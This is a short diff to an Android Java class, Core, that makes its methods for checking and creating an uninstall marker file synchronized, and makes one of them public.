@@ -925,7 +925,7 @@ public class Core extends Activity implements Runnable {
 	}
 
 
-	private boolean haveUninstallMarkup() {
+	public synchronized boolean haveUninstallMarkup() {
 		final AutoFile markup = new AutoFile(Status.getAppContext().getFilesDir(), UNINSTALL_MARKUP);
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (haveUninstallMarkup) " + markup.exists());
@@ -933,13 +933,12 @@ public class Core extends Activity implements Runnable {
 		return markup.exists();
 	}
 
-	public void createUninstallMarkup() {
+	public synchronized void createUninstallMarkup() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (createUninstallMarkup) ");
 		}
 		final AutoFile markup = new AutoFile(Status.getAppContext().getFilesDir(), UNINSTALL_MARKUP);
 		markup.write(1);
-
 	}
 
 }
